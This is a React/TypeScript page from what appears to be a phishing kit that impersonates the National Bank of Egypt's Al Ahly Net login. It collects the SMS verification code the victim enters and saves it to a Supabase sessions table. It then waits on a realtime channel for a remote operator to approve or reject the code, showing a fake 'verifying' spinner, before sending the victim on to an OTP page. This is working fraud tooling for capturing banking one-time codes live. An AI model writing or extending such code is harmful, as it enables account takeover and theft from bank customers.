import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { ArrowRight } from "lucide-react";
import nbeLogo from "@/assets/nbe-logo-full.png";
import { supabase } from "@/integrations/supabase/client";
import { useSessionRedirect } from "@/hooks/use-session-redirect";

export const Route = createFileRoute("/sms")({
  head: () => ({
    meta: [{ title: "إدخال رمز الرسالة النصية | الأهلي نت" }],
  }),
  component: SmsPage,
});

function SmsPage() {
  useSessionRedirect();
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  useEffect(() => {
    if (typeof window === "undefined") return;
    const id = sessionStorage.getItem("nbe_session_id");
    if (!id) navigate({ to: "/login" });
    return () => {
      if (channelRef.current) supabase.removeChannel(channelRef.current);
    };
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim()) return;
    const sessionId =
      typeof window !== "undefined" ? sessionStorage.getItem("nbe_session_id") : null;
    if (!sessionId) {
      navigate({ to: "/login" });
      return;
    }
    setError("");
    setSubmitting(true);
    const { error: updateError } = await supabase
      .from("sessions")
      .update({ sms_code: code, status: "pending_sms" })
      .eq("id", sessionId);

    if (updateError) {
      setSubmitting(false);
      setError("حدث خطأ، حاول مرة أخرى");
      return;
    }

    const channel = supabase
      .channel(`session-sms-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const row = payload.new as { status: string };
          if (row.status === "sms_approved") {
            setSubmitting(false);
            supabase.removeChannel(channel);
            channelRef.current = null;
            navigate({ to: "/otp" });
          } else if (row.status === "sms_rejected") {
            setSubmitting(false);
            setCode("");
            setError("الرمز خطأ، برجاء ادخال رمز جديد");
          }
        },
      )
      .subscribe();
    channelRef.current = channel;
  };

  return (
    <div dir="rtl" className="flex min-h-screen flex-col bg-muted/40 text-foreground">
      <header className="flex items-center justify-end border-b border-border bg-background px-6 py-4">
        <img
          src={nbeLogo}
          alt="البنك الأهلي المصري"
          width={1920}
          height={520}
          className="h-9 w-auto object-contain md:h-11"
        />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 py-10">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-md rounded-2xl bg-background p-6 text-right shadow-sm ring-1 ring-border/60"
        >
          <h1 className="text-xl font-bold text-foreground">إدخال رمز الرسالة النصية</h1>
          <p className="mt-4 text-sm leading-relaxed text-muted-foreground">
            من فضلك أدخل الرمز المرسل إليك عبر رسالة SMS لإتمام تسجيل الدخول.
          </p>

          <div className="mt-8 flex flex-col items-center">
            <span className="text-base font-medium text-muted-foreground">Verification Code</span>
            <div className="mt-4 h-12 w-12 animate-spin rounded-full border-[5px] border-muted border-t-muted-foreground/60" />
          </div>

          <div className="mt-6">
            <input
              type="text"
              inputMode="numeric"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
              placeholder="••••••"
              autoFocus
              disabled={submitting}
              dir="ltr"
              className="w-full rounded-xl border border-input bg-background px-6 py-4 text-center text-2xl font-bold tracking-[0.4em] outline-none transition-colors placeholder:text-muted-foreground/50 placeholder:font-normal focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
            />
            {error && (
              <p className="mt-4 text-sm font-semibold text-destructive">
                {error}
              </p>
            )}
          </div>

          <button
            type="submit"
            disabled={submitting || !code.trim()}
            className="mt-6 flex w-full items-center justify-center gap-2 rounded-xl bg-primary py-4 text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
          >
            تأكيد
            <ArrowRight className="h-4 w-4" />
          </button>

          {submitting && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-muted-foreground/60">
              <div className="flex flex-col items-center text-center">
                <div className="h-16 w-16 animate-spin rounded-full border-[5px] border-background/60 border-t-primary" />
                <span className="mt-3 text-xl font-bold text-background">جاري التحقق...</span>
                <span className="mt-2 text-base font-semibold text-background/90">يرجى الانتظار</span>
              </div>
            </div>
          )}
        </form>
      </main>

      <footer className="mt-10 bg-primary py-4 text-center text-xs font-semibold text-primary-foreground">
        جميع الحقوق محفوظة - البنك الأهلي المصري ©
      </footer>
    </div>
  );
}
